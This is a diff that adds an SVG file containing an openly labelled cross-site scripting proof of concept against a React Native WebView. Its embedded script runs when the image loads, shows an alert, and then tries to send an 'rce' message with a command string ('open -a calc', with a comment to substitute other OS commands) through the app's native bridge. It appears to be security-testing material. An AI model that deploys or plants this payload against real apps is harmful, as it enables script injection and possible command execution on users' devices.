@@ -1,0 +1,19 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <!-- XSS payload triggered on SVG load -->
+  <script type="text/javascript">
+    // Basic XSS proof-of-concept
+    alert('React Native WebView XSS');
+
+    // If the WebView allows access to React Native bridges:
+    // Attempt to call a native module (if exposed)
+    try {
+      // Example: Access React Native's injected functions
+      window.ReactNativeWebView?.postMessage(JSON.stringify({
+        type: 'rce',
+        cmd: 'open -a calc'  // Replace with OS-specific commands
+      }));
+    } catch (e) {
+      // Handle errors (e.g., bridge not available)
+    }
+  </script>
+</svg>
